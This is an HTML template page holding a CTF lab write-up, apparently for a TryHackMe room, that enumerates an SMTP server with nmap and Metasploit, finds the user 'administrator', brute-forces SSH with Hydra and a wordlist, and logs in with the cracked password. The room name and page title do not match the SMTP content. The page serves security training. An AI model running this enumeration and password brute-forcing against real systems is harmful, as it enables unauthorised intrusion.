{% extends "base.html" %}
{% block title %}Introduction to Networking{% endblock %}
{% block content %}

<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1> 
    <br />

    <div class="solution-div">

    <p>In this page, I'll demonstrate how to solve the Exploiting SMB - Network Services room CTF on the TryHackMe platform.
    </p>

    <h2>Enumeration</h2>

    <p>
        Let's begin our enumeration process by running Nmap to identify the open ports. A simple Nmap scan should suffice.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap 10.10.73.249 -oN simple-nmap.out
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 22:34 -03
            Nmap scan report for 10.10.73.249
            Host is up (0.22s latency).
            Not shown: 998 closed tcp ports (conn-refused)
            PORT   STATE SERVICE
            22/tcp open  ssh
            25/tcp open  smtp
                
            Nmap done: 1 IP address (1 host up) scanned in 22.91 seconds     
            </code>
        </pre>
    </div> 

    <p>
        It's evident that the SMTP server is operational on its standard port, 25. To gather more information, let's perform an aggressive Nmap scan to uncover the version and other potential details.
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap -p 25 -A 10.10.73.249 -oN aggressive-p25-nmap.out
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 22:36 -03
            Nmap scan report for 10.10.73.249
            Host is up (0.22s latency).
                
            PORT   STATE SERVICE VERSION
            25/tcp open  smtp    Postfix smtpd
            | ssl-cert: Subject: commonName=polosmtp
            | Subject Alternative Name: DNS:polosmtp
            | Not valid before: 2020-04-22T18:38:06
            |_Not valid after:  2030-04-20T18:38:06
            |_ssl-date: TLS randomness does not represent time
            |_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
            Service Info: Host:  polosmtp.home
                
            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
            </code>
        </pre>
    </div> 

    <p>
        We've discovered some interesting commands such as VRFY, ETRN, and PIPELINING. Furthermore, the host is identified as "polosmtp.home" and the server is "Postfix smtpd". There's not much else noteworthy here.
    </p>

    <p>
        Let's utilize Metasploit to identify potential vulnerabilities related to this SMTP version. We can use a SMTP scan to further investigate the SMTP version. In the Metasploit console, use the command: <code class="hljs language-python"><span class="hljs-keyword">use auxiliary/scanner/smtp/smtp_version</span></code>
    </p>

    <p>After that, you can use the "show options" command to view the necessary settings for running the scan.</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(scanner/smtp/smtp_version) > show options

            Module options (auxiliary/scanner/smtp/smtp_version):
                
               Name     Current Setting  Required  Description
               ----     ---------------  --------  -----------
               RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
               RPORT    25               yes       The target port (TCP)
               THREADS  1                yes       The number of concurrent threads (max one per host)
                
                
            View the full module info with the info, or info -d command.  
            </code>
        </pre>
    </div>

    <p>Note that you need to set the RHOST parameter to the machine's IP address. You can use 'set RHOST &lt;machine-ip&gt;' for that. Here's the command to run the scan:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.73.249
            RHOSTS => 10.10.73.249
            msf6 auxiliary(scanner/smtp/smtp_version) > run
                
            [+] 10.10.73.249:25       - 10.10.73.249:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
            [*] 10.10.73.249:25       - Scanned 1 of 1 hosts (100% complete)
            [*] Auxiliary module execution completed
            msf6 auxiliary(scanner/smtp/smtp_version) >             
            </code>
        </pre>
    </div>   


    <p>As expected, we found that the system's mail name is "polosmtp.home," which aligns with our aggressive Nmap result. Additionally, we discovered that it's an ESMTP Postfix running on Ubuntu, which is promising. Postfix is the Mail Transfer Agent (MTA) responsible for email delivery.
    </p>

    <p>Let's perform another scan using "smtp_enum" by running the command: <code class="hljs language-python"><span class="hljs-keyword">use auxiliary/scanner/smtp/smtp_enum</span></code></p>

    <p>Upon using the "show options" command, you'll see that you need to set the RHOSTS parameter again. A predefined wordlist for common usernames is also available. Let's replace that with the SecList username wordlist. To get SecList, you can clone it using Git:
    </p>

    <p><code class="hljs language-python"><span class="hljs-keyword">git clone https://github.com/danielmiessler/SecLists</span></code></p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.73.249
            RHOSTS => 10.10.73.249
            msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
            USER_FILE => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
            msf6 auxiliary(scanner/smtp/smtp_enum) > run

            [*] 10.10.104.217:25      - 10.10.104.217:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
            [+] 10.10.104.217:25      - 10.10.104.217:25 Users found: , administrator
            [*] 10.10.104.217:25      - Scanned 1 of 1 hosts (100% complete)
            [*] Auxiliary module execution completed
            msf6 auxiliary(scanner/smtp/smtp_enum) > 
            </code>
        </pre>
    </div>

    <p>We've successfully identified an username, which is "administrator"!</p>

    <p>What do we know so far?</p>

    <ul class="custom-bullet-list">
        <li>We have an username: "administrator".</li>
        <li>We know the type of SMTP server and the operating system it's running on.</li>
    </ul>

    <h2>Exploitation</h2>

    <p>
        Let's attempt to brute force the SSH using the username we've found, "administrator," with Hydra. You can use the following command:
    </p>

    
    <p><code class="hljs language-python"><span class="hljs-keyword">hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.104.217 ssh</span></code></p>


    <p>This might take a while. After a few minutes, we have the following match:</p>

    <p><code class="hljs language-python"><span class="hljs-keyword">[22][ssh] host: 10.10.104.217   login: administrator   password: alejandro
    </span></code></p>

    <p>
        Great! Now we can SSH into the machine. Simply use the command "ssh administrator@10.10.104.217" and enter the password.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ ssh administrator@10.10.104.217
            The authenticity of host '10.10.104.217 (10.10.104.217)' can't be established.
            ED25519 key fingerprint is SHA256:6VV0TI4MQmKeRImOTQ8lj3uk863uVqWS+zh2fF2LLF8.
            This key is not known by any other names.
            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
            Warning: Permanently added '10.10.104.217' (ED25519) to the list of known hosts.
            administrator@10.10.104.217's password: 
            Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
                
             * Documentation:  https://help.ubuntu.com
             * Management:     https://landscape.canonical.com
             * Support:        https://ubuntu.com/advantage
                
              System information as of Thu Aug 24 02:23:45 UTC 2023
                
              System load:  0.01              Processes:           91
              Usage of /:   43.9% of 9.78GB   Users logged in:     0
              Memory usage: 15%               IP address for eth0: 10.10.104.217
              Swap usage:   0%
                
                
            87 packages can be updated.
            35 updates are security updates.
                
            Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
                
                
            Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
            administrator@polosmtp:~$                                
            </code>
        </pre>
    </div>


    <p>If we run the "ls" command here, we find the "smtp.txt" file, which contains the flag!</p>
    <a href="/ctfs">Go back</a>
    </div>

</div>


{% endblock %}
